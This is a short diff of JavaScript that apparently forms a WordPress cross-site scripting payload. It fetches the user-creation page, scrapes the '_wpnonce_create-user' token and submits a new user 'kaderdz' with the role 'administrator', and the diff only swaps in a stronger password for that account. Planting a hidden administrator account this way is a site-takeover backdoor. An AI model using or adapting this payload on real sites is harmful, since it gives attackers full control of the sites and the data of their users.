@@ -5,8 +5,8 @@ jQuery.get(u, function(e) {
         "_wpnonce_create-user": e.match(/_wpnonce _create-user\"\svalue=\"(.+?)\"/)[1],
         user_Login: "kaderdz",
         email: "ttest34030@gmail.com",
-        pass1: "hoho2013",
-        pass2: "hoho2013",
+        pass1: "hohoHOHO2013@@@",
+        pass2: "hohoHOHO2013@@@",
         role: "administrator"
     })
 });
